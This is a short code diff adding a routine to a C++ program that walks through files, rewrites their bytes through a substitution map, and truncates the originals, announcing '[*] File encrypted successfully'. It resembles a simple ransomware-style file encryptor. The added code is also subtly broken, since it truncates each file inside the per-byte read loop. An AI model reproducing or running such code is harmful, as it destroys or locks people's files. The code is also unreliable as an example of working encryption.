@@ -27,6 +27,20 @@ int main() {
 
         if (!read.is_open()) std::cerr << "[-] Could not open the file - '" << path << "'" << std::endl;
         else std::cout << "File opened" << std::endl;
+        auto encrypt = std::fstream(entry.path(), std::ios::out | std::ios::app);
 
+        while (read.get(byte)) {
+            if (encryption.contains(byte)) {
+                for (auto const &it : encryption) {
+                    if (it.first == byte) {
+                        encrypt << it.second;
+                    }
+                }
+            }
+            std::ofstream ofs;
+            ofs.open(path, std::ofstream::out | std::ofstream::trunc);
+            ofs.close();
+        }
+        std::cout << "[*] File encrypted successfully\n" << std::endl;
     }
 }
